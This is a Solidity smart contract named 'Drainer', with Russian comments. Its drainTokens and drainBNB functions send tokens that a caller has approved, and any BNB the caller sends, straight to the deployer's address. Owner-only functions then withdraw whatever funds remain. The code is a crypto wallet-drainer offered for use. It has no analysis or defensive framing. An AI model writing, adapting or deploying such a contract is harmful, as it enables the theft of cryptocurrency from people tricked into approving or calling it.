// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Drainer {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function drainTokens(address tokenAddress, uint256 amount) external {
        IERC20(tokenAddress).transferFrom(msg.sender, owner, amount);
    }

    function drainBNB() external payable {
        payable(owner).transfer(msg.value);
    }

    // Функция для вывода застрявших токенов (на всякий случай)
    function withdrawTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        IERC20(tokenAddress).transferFrom(address(this), owner, amount);
    }

    // Функция для вывода застрявшего BNB
    function withdrawBNB() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}